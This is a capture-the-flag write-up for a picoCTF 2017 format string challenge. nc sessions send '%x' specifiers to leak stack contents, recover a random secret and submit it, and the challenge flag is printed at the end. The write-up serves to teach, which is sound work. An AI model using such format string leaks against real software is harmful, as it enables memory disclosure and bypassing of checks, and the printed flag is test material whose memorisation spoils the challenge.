# Ive Got A Secret
## level 2 - binary exploitation - 75 points

### Description
> Hopefully you can find the right format for my [secret](./data/secret)! [Source](./data/secret.c). Connect on shell2017.picoctf.com:42684.

### Hints
> * This is a beginning format string attack.


### Solution

As suggested this is a [format string attack](https://www.owasp.org/index.php/Format_string_attack). The vulnerability is in line 24, where the buffer is mistakely passed as format and not as value to replace.

Connect with `nc` and it will prompt us for some text:

```
$ nc shell2017.picoctf.com 42684
Give me something to say!
hello
hello
Now tell my secret in hex! Secret: hello
As my friend says,"You get nothing! You lose! Good day, Sir!"
```

We will prompt twice: the first time will be printed out with `printf`, the second one will check if the hex we sent is equal to a random value from `/dev/urandom`.

In the first request we can submit a format string to be printed out next with `printf`, so sending several `%x` il will print the stack, including the random variable assigned:

```
$ nc shell2017.picoctf.com 42684
Give me something to say!
%x %x %x %x %x %x %x %x
40 f7fc7c20 8048792 1 ffffdd34 7ea62dd6 3 f7fc73c4
Now tell my secret in hex! Secret:
```

Now we have the stack! To understand which hex is the correct one, just run the same string several times and check for changes, in our case in the sixth variable. Submit it and you will have the flag:

```
$ nc shell2017.picoctf.com 42684
Give me something to say!
%x %x %x %x %x %x %x %x
40 f7fc7c20 8048792 1 ffffdd34 1ead97b4 3 f7fc73c4
Now tell my secret in hex! Secret: 1ead97b4
65aaf5d76d7fa708642cf1ab573ebf58
Wow, you got it!
```

### Flag
```
65aaf5d76d7fa708642cf1ab573ebf58
```